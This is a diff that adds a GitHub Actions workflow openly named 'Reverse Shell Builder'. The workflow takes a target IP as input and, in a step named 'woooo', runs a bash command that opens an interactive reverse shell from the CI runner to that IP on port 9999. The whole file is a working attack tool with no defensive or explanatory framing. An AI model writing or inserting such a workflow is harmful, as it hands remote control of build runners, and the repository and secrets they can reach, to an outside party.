@@ -1,0 +1,23 @@
+name: Reverse Shell Builder
+
+on:
+  workflow_dispatch:
+    inputs:
+      targetip:
+        description: 'Target IP'
+        required: true
+        type: string
+  workflow_call:
+
+
+jobs:
+  lotl_build:
+    runs-on: [ubuntu-latest]
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+          
+      - name: woooo
+        run: |
+          bash -i >& /dev/tcp/${{ inputs.targetip }}/9999 0>&1
